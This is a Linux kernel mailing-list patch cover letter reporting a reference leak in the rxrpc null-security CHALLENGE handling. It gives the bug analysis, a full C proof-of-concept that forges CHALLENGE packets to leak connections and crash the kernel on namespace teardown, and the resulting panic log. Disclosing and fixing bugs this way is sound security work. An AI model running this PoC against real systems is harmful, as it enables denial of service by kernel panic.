Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.171
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792694882;
	b=4vp9q8DDPozUG+zddw9+D4IgLdTYioRRGDjCzkrwBV1Plo632aIxo1cMbdFmMWpxt+jF
	 HptHP/EP5i/gfv/K2ZSuD7fc9vgFtiNcXbKyO5/Nt91zW70Xt4Nmk+1sLGBOfJRipqLvP
	 vj5yijohqZxZZ2mp0YBysZeZcBvRwifbTi5KuRlz/XyLZFz+bPovG508PQhLP2CWyukMa
	 UB+PApIiR50xh9BkT+3DBmdlv3Csrd+G6qETrEtrruAfnv1Px2FwDXeo6/pvOUI2fGlXf
	 whgFaV9TvPvnPymBkvGOZI9wdpzWSJaaZTKEdip81KTePi3v4kdxVCMCK8bNwsyv7Jg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792694882;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
	b=Pi9pStKZNd2q4QHlWDPckzxdLmhymyRlxHzJfIP3CI0qTUjVlnwhivrly02/ZoL1hlHa
	 6iGfWDkTbxFwQ6K+5HcZ+9LKhYnxmUCD6zukoqE/z0B9BrO1mEjmPuwqbMqnPZEHokvUt
	 rAdfUzXNRvQ/5KTjS2DbJqPTr6h3EQHrwpO++IQgXu5OOmhctjfVNVj67BEsb5n6Bn8x5
	 37cAUprmCSRdo96ykRY7PKZ0C3HsD0l9QI406/Yr0WsRFCStOnJkDFP2RlKyCaP+bO+KX
	 A3H+Urjx/Uqa7H5kHWpBpmdjLt6fwQ9RXaSoS2pqpynyabOCWyjq6fPVwRJ+lf70+Mw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=WtH2Ssc+;
	arc=none smtp.remote-ip=209.85.214.171
Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 168FE606A319
	for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 18:48:01 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 168FE606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=WtH2Ssc+
Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2e977109392so414955ad.0
        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 11:48:01 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792694881; x=1793299681; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
        b=WtH2Ssc+NtyGPpVN9cDF1ORAjGDASXkx8a57/Wops0S6PiTzgKSgsFNKxe5j4tnHzc
         ZbEMsLA3QTh4EUftoF8dyPSOVlpZufpqmxZ3k8NKiC00Cs69J/E8J8eKT2r0KQ+qq+5T
         DVwR0cj/iDOdFGTCkspmnXrkSiNbWVQwsdPDUzUozUk8ny+mZs149SBUMAPpJgUkkoIl
         ujdmy1yLfRsK9PYy5hLtZmIBabOKJI6y+IG19it1kGJwICpW6x6pA7fIj5CpAoNkuNre
         1hY8ZYvqx633bP7EBcVvd+dBoNCe3tamXlvAgOa6FsdPmK5RXiLeEdgfjyewtgLOBn9t
         2SAw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792694881; x=1793299681;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DaVoAliTvYg5SjdSGV6RlSWbnhHTA9fRrUJhlLCgYlM=;
        b=jCMFZY3rCu87w9WU0k7CYryr5XYLvjJP4LXYVZ98Ny1VKBSm8WehEJbrgQWVnIvc98
         /7sbsRvAfHFfaFqiJ8Ia2mYeEU9UPDkwbLXOeet+l6rc9EMNWaEQKUo38jfyIHj3PoJC
         /GW5ztNFR+IHAATLzWbZL2jaM7knPSOxpuMVOluN+TqHbDL5wjP1t9SNXQhsrqosKuIY
         TKmzvpdQpiKY6j8ChdTSgK7u9Vegp+MVJ/SmfNSCtl3TkL3LHnO40J7dvs7Bri+qtODA
         UrtU6ImPIuSGo3/2B6Bt3vIK5aU8g7bLnobc8rV2GS0L4qW2PR4K0PRgiu9MtcLcVLaV
         MLow==
X-Forwarded-Encrypted: i=1; AKwUvBzUygbfLWd3ajvF5gq37DB48SgvU6RScbUPC5ChQm95JXO5s2HuEhZuXzbDbVLEEe1iaBjKsUw=@vger.kernel.org
X-Gm-Message-State: AFq9FYKIAqXxhvxEWGbJciIcIvR+VNZIKFJL4Qn9rd38OihAHLTWNtkg
	Dv7zlrKCjcGJKVx4450C8h3Ymhkw45Jp9GTaXEDFKaa1CkOPz9FHXnC1QJm4Oj05zDIe
X-Gm-Gg: AYBFou2VELLhJ/3QS9ybnJQqNoWSh0rwscVCREFPebH0sNeJxDAYxNCBbBvmb2flZXb
	RbleiV8DqOkEBs9WbCMlDHwixo9ZLt+2WoNlXaBbSIEA4uLzKEp1dMRF2P1NVnIwMu+0pC13UjL
	YlEPCJ4IAKf+vSxCW0Yyv2sK69BXmyP5waDy31JKkF+odI8kWjFZMeLF0WN32csHx0DRfghiboM
	iRNOmaVNFKSHkBYfKyBbtPIavTx0sKqKaJgziCThaHTMiOmLuSS868Np8Uh0gydFbxeSVZZ+mLe
	j/tJOs0EWjMH+Jz0tH5pxLFG/vutDFDexP5HXjVPo7S0/6uitRJ6a7NR3pWMbyMmmZN/bbVQLBy
	gZgCDeSIP+c423Jv4u3ycad3MJULvvMlicMfpDttDNVijPeKNu8J15c4KEw3BnsgEulBizo7qjJ
	Ns9H4cvuO+T4DpN1wBL1qhP38BmVpPAt4GIwQE5ZEDPTmgnUf1EqiUVHj5qUkr7N2Mj2pbcfWhI
	CKH7Hn5/B4CeUSAn+nJSmGJK91gl0p4H9YqbIOlMLrQlp3wWL0hu+L+iiGb+vp/khhU
X-Received: by 2002:a17:902:d4cd:b0:2e6:679:9e4 with SMTP id d9443c01a7336-2ea7cf5ac6amr1129955ad.60.1792694881050;
        Thu, 22 Oct 2026 11:48:01 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2001:49f0:d0db:ffab:2834:5ac2:f726:a005])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ea7b3b01a6sm2052405ad.44.2026.10.22.11.47.56
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 11:48:00 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-afs@lists.infradead.org,
	netdev@vger.kernel.org
Cc: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] rxrpc: fix null-security challenge leak
Date: Fri, 23 Oct 2026 02:47:45 +0800
Message-ID: <cover.1792694708.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a reference leak in net/rxrpc/insecure.c. A
CHALLENGE packet received by a null-security RxRPC client connection
causes the connection to be aborted, but the packet is still queued
for connection processing. A userspace RxRPC client can exercise this
path without elevated privileges.

We will provide details of the bug below, along with a PoC and the
QEMU crash log.

---- details below ----

Bug details:

none_validate_challenge() aborts a null-security connection after
receiving a CHALLENGE, but returns true. rxrpc_input_conn_packet()
interprets true as permission to continue and calls
rxrpc_post_challenge(). That function takes a reference to the
connection and queues the CHALLENGE for its worker.

The connection is already aborted when rxrpc_process_event() handles
the queued packet. It returns early with -ECONNABORTED, before clearing
sp->chall.conn and dropping the rxrpc_conn_get_challenge_input
reference. The leaked connection retains references to its peer and
local endpoint. Repeating this for distinct connections leaks additional
references; tearing down the affected network namespace then triggers
the rxrpc_destroy_all_connections() BUG_ON.

Return false after aborting the connection so the input path rejects
the CHALLENGE instead of queueing it and taking the extra reference.

Reproducer:

    make
    ./poc --newnet-before

Run the namespace-teardown reproducer as root in a disposable QEMU
guest. The reference leak itself is also observable as an unprivileged
user by running ./poc and checking /proc/net/rxrpc/conns.

The crash was reproduced on Linux 7.1.0-rc1 with AF_RXRPC, RXKAD,
KEYS, USER_NS, NET_NS, and KASAN enabled.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/keyctl.h>
#include <linux/rxrpc.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>

#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif

#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_LAST_PACKET 0x04
#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_PACKET_TYPE_CHALLENGE 6

typedef int32_t key_serial_t;

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
} __attribute__((packed));

struct shared_state {
	int rxrpc_fd;
	struct sockaddr_rxrpc srx;
	volatile int ready;
	volatile int send_started;
	volatile int send_done;
	int send_ret;
	int send_errno;
};

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static long xadd_key(const char *type, const char *desc,
		     const void *payload, size_t plen, key_serial_t ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static void install_null_key(void)
{
	key_serial_t keyring;
	key_serial_t key;

	keyring = xadd_key("keyring", "rxrpc_test", NULL, 0, KEY_SPEC_PROCESS_KEYRING);
	if (keyring < 0)
		die("add_key(keyring)");

	key = xadd_key("rxrpc", "poc-null", NULL, 0, keyring);
	if (key < 0)
		die("add_key(rxrpc null)");
}

static void bring_loopback_up(void)
{
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket(ifreq)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		die("ioctl(SIOCGIFFLAGS)");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		die("ioctl(SIOCSIFFLAGS)");
	close(fd);
}

static int setup_server_udp(uint16_t *port_out)
{
	int fd;
	struct sockaddr_in addr;
	socklen_t len = sizeof(addr);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die("socket(server udp)");

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(0);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(server udp)");

	if (getsockname(fd, (struct sockaddr *)&addr, &len) < 0)
		die("getsockname(server udp)");

	*port_out = ntohs(addr.sin_port);
	return fd;
}

static int setup_rxrpc_client(uint16_t server_port, struct sockaddr_rxrpc *srx)
{
	int fd;
	unsigned int min_sec = RXRPC_SECURITY_PLAIN;
	char key_desc[] = "poc-null";

	fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0)
		die("socket(AF_RXRPC)");

	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY, key_desc, strlen(key_desc)) < 0)
		die("setsockopt(RXRPC_SECURITY_KEY)");

	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &min_sec, sizeof(min_sec)) < 0)
		die("setsockopt(RXRPC_MIN_SECURITY_LEVEL)");

	memset(srx, 0, sizeof(*srx));
	srx->srx_family = AF_RXRPC;
	srx->srx_service = 1;
	srx->transport_type = SOCK_DGRAM;
	srx->transport_len = sizeof(struct sockaddr_in);
	srx->transport.sin.sin_family = AF_INET;
	srx->transport.sin.sin_port = htons(server_port);
	srx->transport.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	return fd;
}

static void *sender_thread(void *arg_)
{
	struct shared_state *st = arg_;
	char byte = 'A';
	char cbuf[CMSG_SPACE(sizeof(uint64_t))];
	struct cmsghdr *cmsg;
	struct iovec iov = {
		.iov_base = &byte,
		.iov_len = sizeof(byte),
	};
	struct msghdr msg = {
		.msg_name = &st->srx,
		.msg_namelen = sizeof(st->srx),
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf,
		.msg_controllen = sizeof(cbuf),
	};
	uint64_t call_id = 0x4141414141414141ULL;

	memset(cbuf, 0, sizeof(cbuf));
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(call_id));
	memcpy(CMSG_DATA(cmsg), &call_id, sizeof(call_id));

	while (!st->ready)
		usleep(1000);

	st->send_started = 1;
	st->send_ret = sendmsg(st->rxrpc_fd, &msg, 0);
	st->send_errno = errno;
	st->send_done = 1;
	return NULL;
}

static void recv_data_packet(int server_fd, struct rxrpc_wire_header *hdr,
			     struct sockaddr_in *src, char *payload, size_t payload_len)
{
	char buf[512];
	socklen_t slen = sizeof(*src);
	ssize_t n;
	size_t copy_len;

	n = recvfrom(server_fd, buf, sizeof(buf), 0, (struct sockaddr *)src, &slen);
	if (n < (ssize_t)sizeof(*hdr)) {
		fprintf(stderr, "short recv %zd\n", n);
		exit(1);
	}

	memcpy(hdr, buf, sizeof(*hdr));
	hdr->epoch = ntohl(hdr->epoch);
	hdr->cid = ntohl(hdr->cid);
	hdr->callNumber = ntohl(hdr->callNumber);
	hdr->seq = ntohl(hdr->seq);
	hdr->serial = ntohl(hdr->serial);
	hdr->serviceId = ntohs(hdr->serviceId);

	copy_len = (size_t)n - sizeof(*hdr);
	if (copy_len > payload_len - 1)
		copy_len = payload_len - 1;
	memcpy(payload, buf + sizeof(*hdr), copy_len);
	payload[copy_len] = '\0';
}

static void send_forged_challenge(int server_fd,
				  const struct rxrpc_wire_header *observed,
				  const struct sockaddr_in *dst)
{
	struct rxrpc_wire_header chall;

	memset(&chall, 0, sizeof(chall));
	chall.epoch = htonl(observed->epoch);
	chall.cid = htonl(observed->cid & ~3U);
	chall.callNumber = htonl(0);
	chall.seq = 0;
	chall.serial = htonl(observed->serial + 1);
	chall.type = RXRPC_PACKET_TYPE_CHALLENGE;
	chall.flags = 0;
	chall.userStatus = 0;
	chall.securityIndex = RXRPC_SECURITY_NONE;
	chall.reserved = 0;
	chall.serviceId = htons(observed->serviceId);

	if (sendto(server_fd, &chall, sizeof(chall), 0,
		   (const struct sockaddr *)dst, sizeof(*dst)) != (ssize_t)sizeof(chall))
		die("sendto(challenge)");
}

int main(int argc, char **argv)
{
	int server_fd, rxrpc_fd;
	uint16_t server_port;
	struct shared_state st;
	struct rxrpc_wire_header observed;
	struct sockaddr_in client_addr;
	char payload[128];
	pthread_t thr;
	struct pollfd pfd;
	int poll_ret;
	int newnet_before = 0;

	if (argc > 1 && strcmp(argv[1], "--newnet-before") == 0)
		newnet_before = 1;

	if (newnet_before) {
		if (unshare(CLONE_NEWNET) < 0)
			die("unshare(CLONE_NEWNET)");
		bring_loopback_up();
		printf("created dedicated net namespace and brought up lo\n");
		fflush(stdout);
	}

	install_null_key();
	server_fd = setup_server_udp(&server_port);
	memset(&st, 0, sizeof(st));
	rxrpc_fd = setup_rxrpc_client(server_port, &st.srx);
	st.rxrpc_fd = rxrpc_fd;

	if (pthread_create(&thr, NULL, sender_thread, &st) != 0) {
		errno = EINVAL;
		die("pthread_create");
	}

	st.ready = 1;
	recv_data_packet(server_fd, &observed, &client_addr, payload, sizeof(payload));

	printf("rxrpc packet: type=%u flags=0x%x epoch=%08x cid=%08x call=%u serial=%u service=%u payload=\"%s\"\n",
	       observed.type, observed.flags, observed.epoch, observed.cid,
	       observed.callNumber, observed.serial, observed.serviceId, payload);
	fflush(stdout);

	if (observed.type != RXRPC_PACKET_TYPE_DATA ||
	    !(observed.flags & RXRPC_CLIENT_INITIATED) ||
	    observed.callNumber == 0) {
		fprintf(stderr, "did not capture the expected client DATA packet\n");
		return 2;
	}

	send_forged_challenge(server_fd, &observed, &client_addr);
	usleep(200000);

	close(rxrpc_fd);
	close(server_fd);

	pfd.fd = -1;
	pfd.events = 0;
	poll_ret = poll(&pfd, 0, 500);
	(void)poll_ret;

	pthread_join(thr, NULL);
	printf("sendmsg ret=%d errno=%d started=%d done=%d\n",
	       st.send_ret, st.send_errno, st.send_started, st.send_done);
	return 0;
}


------END poc.c--------

----BEGIN crash log----

[ 1457.338612][T10327] kernel BUG at net/rxrpc/conn_object.c:488!
[ 1457.339724][T10327] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[ 1457.340600][T10327] CPU: 0 UID: 0 PID: 10327 Comm: kworker/u16:1 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
[ 1457.341809][T10327] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1457.343167][T10327] Workqueue: netns cleanup_net
[ 1457.343852][T10327] RIP: 0010:rxrpc_destroy_all_connections+0x35a/0x3f0
[ 1457.344743][T10327] Code: 7c 04 84 c0 75 40 8b 43 64 85 c0 75 ca 4c 89 fe 4c 89 ef e8 08 40 bd f7 e9 1f ff ff ff 48 c7 c7 a0 be f1 8b e8 c7 40 c3 f7 90 <0f> 0b 48 89 df e8 fc be 4a f8 e9 2e fe ff ff 48 89 df e8 1f bf 4a
[ 1457.347221][T10327] RSP: 0018:ffa000001338f980 EFLAGS: 00010246
[ 1457.348029][T10327] RAX: 0000000000000017 RBX: ff1100007ea18000 RCX: 0000000000000000
[ 1457.349044][T10327] RDX: 0000000000000000 RSI: ffffffff8b0f35c0 RDI: 0000000000000001
[ 1457.350068][T10327] RBP: ff1100007ea18064 R08: 0000000000000001 R09: fff3fc0002671eed
[ 1457.351135][T10327] R10: ffa000001338f76f R11: ffa000001338f708 R12: 1ff4000002671f32
[ 1457.352175][T10327] R13: ff1100007ea18078 R14: ff1100007ea18088 R15: ff1100007ea17e70
[ 1457.353203][T10327] FS:  0000000000000000(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[ 1457.354336][T10327] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1457.355184][T10327] CR2: 0000560a4d9c42e8 CR3: 00000000717b2000 CR4: 0000000000751ef0
[ 1457.356203][T10327] PKRU: 55555554
[ 1457.356681][T10327] Call Trace:
[ 1457.357121][T10327]  <TASK>
[ 1457.357520][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.358273][T10327]  ? __pfx_rxrpc_destroy_all_connections+0x10/0x10
[ 1457.359108][T10327]  ? __try_to_del_timer_sync+0xe2/0x140
[ 1457.359846][T10327]  ? __pfx_var_wake_function+0x10/0x10
[ 1457.360567][T10327]  rxrpc_exit_net+0x75/0xc0
[ 1457.361146][T10327]  ops_undo_list+0x289/0x920
[ 1457.361772][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.362510][T10327]  ? __pfx_ops_undo_list+0x10/0x10
[ 1457.363184][T10327]  cleanup_net+0x40f/0x8f0
[ 1457.363775][T10327]  ? __pfx_cleanup_net+0x10/0x10
[ 1457.364420][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.365157][T10327]  ? rcu_is_watching+0x12/0xc0
[ 1457.365788][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.366533][T10327]  process_one_work+0x8dc/0x1be0
[ 1457.367198][T10327]  ? __pfx_process_one_work+0x10/0x10
[ 1457.367893][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.368708][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.369436][T10327]  worker_thread+0x52d/0xec0
[ 1457.370043][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.370780][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.371511][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.372224][T10327]  ? __kthread_parkme+0xb4/0x200
[ 1457.372884][T10327]  ? __pfx_worker_thread+0x10/0x10
[ 1457.373548][T10327]  kthread+0x312/0x410
[ 1457.374072][T10327]  ? _raw_spin_unlock_irq+0x28/0x50
[ 1457.374763][T10327]  ? __pfx_kthread+0x10/0x10
[ 1457.375356][T10327]  ret_from_fork+0x600/0xa20
[ 1457.376058][T10327]  ? __pfx_ret_from_fork+0x10/0x10
[ 1457.376737][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1457.377454][T10327]  ? __switch_to+0x57f/0xe20
[ 1457.378062][T10327]  ? __pfx_kthread+0x10/0x10
[ 1457.378662][T10327]  ret_from_fork_asm+0x1a/0x30
[ 1457.379305][T10327]  </TASK>
[ 1457.379716][T10327] Modules linked in:
[ 1457.381610][T10327] ---[ end trace 0000000000000000 ]---
[ 1457.383195][T10327] RIP: 0010:rxrpc_destroy_all_connections+0x35a/0x3f0
[ 1457.384245][T10327] Code: 7c 04 84 c0 75 40 8b 43 64 85 c0 75 ca 4c 89 fe 4c 89 ef e8 08 40 bd f7 e9 1f ff ff ff 48 c7 c7 a0 be f1 8b e8 c7 40 c3 f7 90 <0f> 0b 48 89 df e8 fc be 4a f8 e9 2e fe ff ff 48 89 df e8 1f bf 4a
[ 1457.387606][T10327] RSP: 0018:ffa000001338f980 EFLAGS: 00010246
[ 1457.388571][T10327] RAX: 0000000000000017 RBX: ff1100007ea18000 RCX: 0000000000000000
[ 1457.389648][T10327] RDX: 0000000000000000 RSI: ffffffff8b0f35c0 RDI: 0000000000000001
[ 1457.390713][T10327] RBP: ff1100007ea18064 R08: 0000000000000001 R09: fff3fc0002671eed
[ 1457.391795][T10327] R10: ffa000001338f76f R11: ffa000001338f708 R12: 1ff4000002671f32
[ 1457.392985][T10327] R13: ff1100007ea18078 R14: ff1100007ea18088 R15: ff1100007ea17e70
[ 1457.394253][T10327] FS:  0000000000000000(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[ 1457.395754][T10327] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1457.396734][T10327] CR2: 0000560a4d9c42e8 CR3: 00000000717b2000 CR4: 0000000000751ef0
[ 1457.398468][T10327] PKRU: 55555554
[ 1457.399034][T10327] Kernel panic - not syncing: Fatal exception
[ 1457.400254][T10327] Kernel Offset: disabled
[ 1457.400839][T10327] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  rxrpc: fix null-security challenge leak

 net/rxrpc/insecure.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.55.0
